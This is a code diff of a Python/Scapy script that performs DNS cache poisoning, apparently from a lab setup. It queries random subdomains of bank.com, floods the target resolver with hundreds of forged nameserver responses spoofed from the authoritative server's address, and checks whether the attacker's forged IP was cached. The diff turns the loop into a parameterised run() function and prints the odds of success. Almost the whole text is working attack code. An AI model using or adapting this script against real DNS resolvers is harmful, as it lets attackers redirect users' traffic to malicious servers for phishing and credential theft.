@@ -15,31 +15,32 @@ target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
 # Target domain base to be messed with
 target_domain_base = ".bank.com."
 target_ns = "bank.com."
-# Authoritative NS for the target domain
-known_ns_domain = "ns01.cashparking.com."
-known_ns_ip = "216.69.185.38"
 
 # Malicious DNS server
 attacker_dns_ip = os.environ['ATK_SERVER_IP']
 expected_ip = os.environ['ATK_FORGED_IP']
 
 
-def initial_request(domain):
-    return Ether() / IP(dst=target_dns_ip) / UDP(dport=target_dns_port_in) / DNS(
+def request(domain):
+    return IP(dst=target_dns_ip) / UDP(dport=target_dns_port_in) / DNS(
         id=42,
         qr=0,
+        opcode=0,
         rd=1,
         ra=0,
         qdcount=1,
         ancount=0,
         nscount=0,
         arcount=0,
-        qd=DNSQR(qname=domain, qtype='A', qclass='IN')
+        qd=DNSQR(qname=domain, qtype='A', qclass='IN'),
+        an=0,
+        ns=0,
+        ar=0
     )
 
 
-def forged_ns_response(id, target_domain):
-    response = Ether() / IP(src=known_ns_ip, dst=target_dns_ip) / UDP(dport=target_dns_port_out) / DNS(
+def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
+    response = Ether() / IP(src=known_ns_ip, dst=target_dns_ip) / UDP(sport=53, dport=target_dns_port_out) / DNS(
         id=id,  # Query ID / transaction id
         qr=1,  # QR (Query / Response) 1=response
         opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
@@ -68,32 +69,30 @@ def forged_ns_response(id, target_domain):
     return response
 
 
-counter = 0
-while True:
-    target_domain = "www{}{}".format(counter, target_domain_base)
-    counter += 1
+def run(offset, response_amount, known_ns_domain, known_ns_ip):
+    counter = 0
+    while True:
+        target_domain = "www{}{}{}".format(offset, counter, target_domain_base)
+        counter += 1
 
-    packet_list = [initial_request(target_domain)]
+        packet_list = [Ether() / request(target_domain)]
+        r = random.randint(0, (2 ** 16) - response_amount + 1)
+        for i in range(r, r + response_amount):
+            packet_list.append(forged_ns_response(i, target_domain, known_ns_domain, known_ns_ip))
 
-    response_amount = 500
-    r = random.randint(0, (2 ** 16) - response_amount + 1)
-    for i in range(r, r + response_amount):
-        packet_list.append(
-            forged_ns_response(i, target_domain))
+        print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}"
+              .format(known_ns_ip, r, r + response_amount, target_dns_ip))
+        print("Chance of success: 1-(1-{:d}/65536)**{:d} = {:.2f}%"
+              .format(response_amount, counter, 1 - pow((1 - response_amount / 65536.), counter)))
 
-    print("Sending packets from {} with id in interval [{:#x}, {:#x}] to {}".format(known_ns_ip, r, r + response_amount,
-                                                                                    target_dns_ip))
+        sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
+        dns_response = sr1(request(target_domain), verbose=0)
 
-    sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
-
-    dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=target_domain)), verbose=0)
-
-    try:
-        if dns_response[DNS].an.rdata == expected_ip:
-            print("Successfully poisoned the zone of {}".format(target_domain_base))
-            break
-        else:
+        try:
+            if dns_response[DNS].an.rdata == expected_ip:
+                print("Successfully poisoned the zone of {}".format(target_ns))
+                break
+            else:
+                print("Poisoning failed")
+        except:
             print("Poisoning failed")
-    except:
-        print("Poisoning failed")
-    break
